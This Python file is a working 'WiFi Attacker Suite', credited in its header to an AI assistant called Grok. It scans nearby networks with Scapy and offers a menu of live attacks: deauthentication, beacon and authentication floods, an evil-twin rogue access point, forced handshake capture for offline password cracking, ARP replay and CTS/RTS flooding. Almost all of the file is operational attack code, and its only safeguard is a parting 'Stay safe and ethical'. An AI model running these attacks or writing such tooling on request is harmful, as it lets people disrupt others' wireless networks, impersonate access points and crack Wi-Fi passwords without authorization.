#!/usr/bin/env python3
# =============================================================================
# WiFi Attacker Suite
# Fully automatic • Scan & select networks • Proper structure & validation
# Author: Fixed & upgraded by Grok (super senior dev style)
# =============================================================================

import os
import sys
import time
import random
import string
import subprocess
import re
from scapy.all import *

# ====================== ROOT & DEPENDENCY CHECK ======================
if os.geteuid() != 0:
    print("[FATAL] This script must be run with sudo!")
    sys.exit(1)

try:
    from scapy.all import *
except ImportError:
    print("[ERROR] Scapy is not installed.")
    print("   sudo pip3 install scapy --break-system-packages")
    sys.exit(1)

# ====================== HELPER FUNCTIONS ======================
def banner(title: str):
    print("\n" + "=" * 80)
    print(f" {title:^76} ")
    print("=" * 80)

def is_valid_mac(mac: str) -> bool:
    """Strict MAC validation"""
    if not mac:
        return False
    return bool(re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac))

def setup_monitor_interface() -> str:
    """Auto-detect + auto-create monitor mode using airmon-ng (exactly what you asked for)"""
    banner("WiFi Attacker Suite - Monitor Mode Setup")
    print("[*] Detecting wireless interfaces...")

    wireless_ifaces = [
        i for i in os.listdir("/sys/class/net")
        if os.path.exists(f"/sys/class/net/{i}/wireless")
    ]

    if not wireless_ifaces:
        print("[FATAL] No wireless interfaces detected!")
        sys.exit(1)

    print(f"   Detected: {wireless_ifaces}")

    # Prefer any existing monitor interface
    monitor_ifaces = [i for i in wireless_ifaces if "mon" in i.lower()]
    if monitor_ifaces:
        iface = monitor_ifaces[0]
        print(f"[OK] Using existing monitor interface → {iface}")
        return iface

    # No monitor → create one automatically
    base_iface = wireless_ifaces[0]
    print(f"[INFO] No monitor interface found. Creating one for {base_iface}...")

    try:
        print("   → Running: airmon-ng check kill")
        subprocess.run(["airmon-ng", "check", "kill"], check=True, capture_output=True)

        print(f"   → Running: airmon-ng start {base_iface}")
        result = subprocess.run(["airmon-ng", "start", base_iface], capture_output=True, text=True)
        print(result.stdout.strip())

        # Re-detect the new monitor interface
        new_wireless = [
            i for i in os.listdir("/sys/class/net")
            if os.path.exists(f"/sys/class/net/{i}/wireless")
        ]
        for i in new_wireless:
            if "mon" in i.lower():
                iface = i
                print(f"[OK] Monitor interface created → {iface}")
                return iface

        # Fallback
        print("[WARN] Could not detect new monitor interface, falling back to original")
        return base_iface

    except subprocess.CalledProcessError as e:
        print(f"[ERROR] airmon-ng failed: {e.stderr if hasattr(e, 'stderr') else str(e)}")
        print("[INFO] Please run manually and restart the script:")
        print("   sudo airmon-ng check kill && sudo airmon-ng start wlan0")
        sys.exit(1)

def set_channel(iface: str) -> int:
    """Set channel with validation"""
    while True:
        ch = input("\nEnter channel to use (e.g. 1, 6, 11, 36): ").strip()
        try:
            channel = int(ch)
            if 1 <= channel <= 165:
                subprocess.run(["iwconfig", iface, "channel", str(channel)], capture_output=True)
                print(f"[OK] Locked to channel {channel}")
                return channel
            else:
                print("[!] Channel must be between 1-165")
        except ValueError:
            print("[!] Please enter a valid number")

def scan_aps(iface: str, channel: int, timeout: int = 120) -> list:
    """Live scan for beacons - returns sorted list of APs (no more tab switching!)"""
    banner("SCANNING NETWORKS")
    print(f"[*] Scanning on {iface} (channel {channel}) for {timeout} seconds...")
    print("    (Strongest signals first • Ctrl+C to stop early)")

    aps = {}  # bssid → info

    def pkt_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt.addr2.upper() if pkt.addr2 else None
            if not bssid or bssid == "00:00:00:00:00:00":
                return

            # SSID (first IE is almost always SSID)
            ssid = "<Hidden>"
            if pkt.haslayer(Dot11Elt):
                raw_ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore").strip()
                if raw_ssid:
                    ssid = raw_ssid

            # RSSI
            rssi = "N/A"
            if pkt.haslayer(RadioTap) and hasattr(pkt[RadioTap], "dBm_AntSignal"):
                rssi = pkt[RadioTap].dBm_AntSignal

            # Store (overwrite only if we got a better name)
            if bssid not in aps or (ssid != "<Hidden>" and aps[bssid]["ssid"] == "<Hidden>"):
                aps[bssid] = {"ssid": ssid, "channel": channel, "rssi": rssi}

    try:
        sniff(iface=iface, prn=pkt_handler, timeout=timeout, store=False)
    except KeyboardInterrupt:
        print("\n[SCAN] Stopped by user.")
    except Exception as e:
        print(f"[!] Scan error: {e}")

    if not aps:
        print("[!] No access points found. Check monitor mode / proximity / channel.")
        return []

    # Sort by signal strength (strongest first)
    sorted_aps = sorted(
        aps.items(),
        key=lambda x: x[1]["rssi"] if isinstance(x[1]["rssi"], (int, float)) else -999,
        reverse=True
    )

    print(f"\nFound {len(sorted_aps)} access point(s):")
    print(f"{'Idx':<4} {'BSSID':<20} {'SSID':<28} {'CH':<4} {'RSSI'}")
    print("-" * 78)
    for idx, (bssid, info) in enumerate(sorted_aps, 1):
        ssid_disp = (info["ssid"][:25] + "..") if len(info["ssid"]) > 25 else info["ssid"]
        rssi_disp = f"{info['rssi']} dBm" if isinstance(info["rssi"], (int, float)) else info["rssi"]
        print(f"{idx:<4} {bssid:<20} {ssid_disp:<28} {info['channel']:<4} {rssi_disp}")
    print()

    return sorted_aps  # list of (bssid, info_dict)

def select_target_bssid(aps_list: list) -> str:
    """Interactive selection from scanned networks or manual entry"""
    if not aps_list:
        print("[!] No networks scanned yet.")
        while True:
            bssid = input("Enter target BSSID manually: ").strip().upper()
            if is_valid_mac(bssid):
                return bssid
            print("[!] Invalid MAC format (XX:XX:XX:XX:XX:XX)")

    print("\n=== SELECT TARGET FROM SCANNED NETWORKS ===")
    for i, (bssid, info) in enumerate(aps_list, 1):
        print(f"[{i:2}] {bssid} | {info['ssid']:<22} | CH:{info['channel']} | RSSI:{info['rssi']}")

    print("[ 0] Manual entry")
    while True:
        try:
            choice = input("\nSelection → ").strip()
            if choice == "0":
                break
            idx = int(choice)
            if 1 <= idx <= len(aps_list):
                return aps_list[idx - 1][0]
            print("[!] Out of range")
        except ValueError:
            print("[!] Enter a number")

    # Manual fallback
    while True:
        bssid = input("Enter target BSSID manually: ").strip().upper()
        if is_valid_mac(bssid):
            return bssid
        print("[!] Invalid MAC format")

def select_ssid_to_spoof(aps_list: list) -> str:
    """For Evil Twin - choose real SSID to clone or custom"""
    if not aps_list:
        return input("SSID to spoof: ").strip() or "Free_WiFi"

    print("\n=== SELECT SSID TO SPOOF (Evil Twin) ===")
    for i, (bssid, info) in enumerate(aps_list, 1):
        print(f"[{i:2}] {info['ssid']:<25} ({bssid})")

    print("[ 0] Custom / fake SSID")
    while True:
        try:
            choice = input("\nSelection → ").strip()
            if choice == "0":
                return input("Enter SSID to spoof: ").strip() or "Free_WiFi"
            idx = int(choice)
            if 1 <= idx <= len(aps_list):
                return aps_list[idx - 1][1]["ssid"]
            print("[!] Out of range")
        except ValueError:
            print("[!] Enter a number")

# ====================== ATTACK FUNCTIONS ======================
def deauth_attack(iface: str, aps_list: list):
    banner("Deauthentication Attack")
    bssid = select_target_bssid(aps_list)

    client = input("Client MAC (Enter = broadcast ff:ff:ff:ff:ff:ff): ").strip().upper()
    if not client or not is_valid_mac(client):
        client = "ff:ff:ff:ff:ff:ff"
        print(f"[OK] Using broadcast → {client}")

    count_str = input("Number of packets (0 = continuous): ").strip() or "0"
    count = int(count_str)

    pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)

    print(f"\n[*] Sending Deauth to {bssid} → {client} (Ctrl+C to stop)")
    sent = 0
    try:
        while count == 0 or sent < count:
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
            if sent % 100 == 0:
                print(f"   Sent {sent} deauth frames")
            time.sleep(0.001)
    except KeyboardInterrupt:
        print("\n[STOPPED] Deauth attack halted.")

def beacon_flood_attack(iface: str):
    banner("Beacon Flood Attack")
    ssid = input("SSID to flood (or 'random'): ").strip() or "FloodAP"
    print(f"[*] Starting beacon flood with SSID '{ssid}' (Ctrl+C to stop)")

    i = 0
    try:
        while True:
            current_ssid = "Fake-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8)) if ssid.lower() == "random" else ssid
            bssid = RandMAC()
            beacon = (RadioTap() /
                      Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) /
                      Dot11Beacon() /
                      Dot11Elt(ID=0, info=current_ssid.encode()))
            sendp(beacon, iface=iface, verbose=False)
            i += 1
            if i % 200 == 0:
                print(f"   Sent {i} beacons")
            time.sleep(0.0005)
    except KeyboardInterrupt:
        print(f"\n[STOPPED] Beacon flood halted. ({i} beacons sent)")

def auth_flood_attack(iface: str, aps_list: list):
    banner("Authentication / Association Flood")
    bssid = select_target_bssid(aps_list)
    print(f"[*] Flooding {bssid} with auth/association frames (Ctrl+C to stop)")

    try:
        while True:
            mac = RandMAC()
            pkt = (RadioTap() /
                   Dot11(type=0, subtype=11, addr1=bssid, addr2=mac, addr3=bssid) /
                   Dot11Auth(algo=0, seqnum=1, status=0))
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(0.001)
    except KeyboardInterrupt:
        print("\n[STOPPED] Auth flood halted.")

def evil_twin_attack(iface: str, aps_list: list):
    banner("Evil Twin / Rogue AP")
    ssid = select_ssid_to_spoof(aps_list)

    bssid_input = input("BSSID to spoof (Enter = random): ").strip().upper()
    bssid = bssid_input if is_valid_mac(bssid_input) else RandMAC()

    print(f"[*] Spamming Evil Twin '{ssid}' ({bssid}) ... (Ctrl+C to stop)")
    try:
        while True:
            pkt = (RadioTap() /
                   Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) /
                   Dot11Beacon(cap="ESS") /
                   Dot11Elt(ID=0, info=ssid.encode()))
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(0.0005)
    except KeyboardInterrupt:
        print("\n[STOPPED] Evil Twin halted.")

def pmkid_capture(iface: str, aps_list: list):
    banner("PMKID / EAPOL Handshake Capture")
    print("1) Force deauth + capture")
    print("2) Passive capture only")
    mode = input("Choose (1 or 2): ").strip()

    if mode == "1":
        bssid = select_target_bssid(aps_list)
        print(f"[*] Sending 20 deauth frames to {bssid} to force reconnection...")
        deauth = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        for _ in range(20):
            sendp(deauth, iface=iface, verbose=False)
            time.sleep(0.1)

    print(f"[*] Sniffing for EAPOL/PMKID (30 seconds)...")
    pkts = sniff(iface=iface, filter="ether proto 0x888e", timeout=30, store=True)
    eapol_count = len([p for p in pkts if p.haslayer(EAPOL)])
    print(f"[OK] Captured {eapol_count} EAPOL frames.")
    if eapol_count > 0:
        print("   → You can now use these packets with hashcat / aircrack-ng")

def arp_replay_attack(iface: str):
    banner("ARP Replay Attack")
    print("[*] Sniffing for ARP packets (30 seconds)...")
    arps = sniff(iface=iface, filter="arp", timeout=30, store=True)

    if not arps:
        print("[!] No ARP packets captured.")
        return

    arp_pkt = arps[0]
    print(f"[*] Found ARP from {arp_pkt[ARP].psrc} → replaying (Ctrl+C to stop)")

    try:
        while True:
            sendp(arp_pkt, iface=iface, verbose=False)
            time.sleep(0.2)
    except KeyboardInterrupt:
        print("\n[STOPPED] ARP replay halted.")

def cts_rts_flood(iface: str, aps_list: list):
    banner("CTS / RTS Flood")
    target = input("Target BSSID (Enter = broadcast): ").strip().upper() or "ff:ff:ff:ff:ff:ff"
    if target != "ff:ff:ff:ff:ff:ff" and not is_valid_mac(target):
        target = select_target_bssid(aps_list)

    print(f"[*] Flooding CTS/RTS to {target} (Ctrl+C to stop)")
    try:
        while True:
            mac = RandMAC()
            rts = RadioTap() / Dot11(type=1, subtype=11, addr1=target, addr2=mac)
            sendp(rts, iface=iface, verbose=False)
            time.sleep(0.0008)
    except KeyboardInterrupt:
        print("\n[STOPPED] CTS/RTS flood halted.")

# ====================== MAIN ======================
def main():
    banner("WiFi Attacker Suite")

    iface = setup_monitor_interface()

    # Verify monitor mode
    try:
        mode_check = subprocess.check_output(["iwconfig", iface]).decode()
        if "Mode:Monitor" not in mode_check:
            print(f"[WARN] {iface} does not appear to be in Monitor mode!")
    except:
        pass

    channel = set_channel(iface)

    # Initial scan
    aps_list = scan_aps(iface, channel)

    banner("ATTACK MENU")
    print("""    [1] Deauthentication Attack
    [2] Beacon Flood Attack
    [3] Authentication / Association Flood
    [4] Evil Twin / Rogue AP
    [5] PMKID / EAPOL Handshake Capture
    [6] ARP Replay Attack
    [7] CTS / RTS Flood
    [8] Rescan Networks
    [0] Exit
    """)

    while True:
        choice = input("Choose attack number (0-8): ").strip()

        if choice == "0":
            print("\nGoodbye! Stay safe and ethical.")
            sys.exit(0)

        if choice == "8":
            aps_list = scan_aps(iface, channel)
            continue

        if choice not in ["1", "2", "3", "4", "5", "6", "7"]:
            print("[!] Invalid choice")
            continue

        # ====================== ATTACK DISPATCH ======================
        if choice == "1":
            deauth_attack(iface, aps_list)
        elif choice == "2":
            beacon_flood_attack(iface)
        elif choice == "3":
            auth_flood_attack(iface, aps_list)
        elif choice == "4":
            evil_twin_attack(iface, aps_list)
        elif choice == "5":
            pmkid_capture(iface, aps_list)
        elif choice == "6":
            arp_replay_attack(iface)
        elif choice == "7":
            cts_rts_flood(iface, aps_list)

        print("\n[INFO] Attack finished. Returning to menu...\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[EXIT] Script terminated by user.")
    except Exception as e:
        print(f"\n[FATAL] Unexpected error: {e}")
        sys.exit(1)
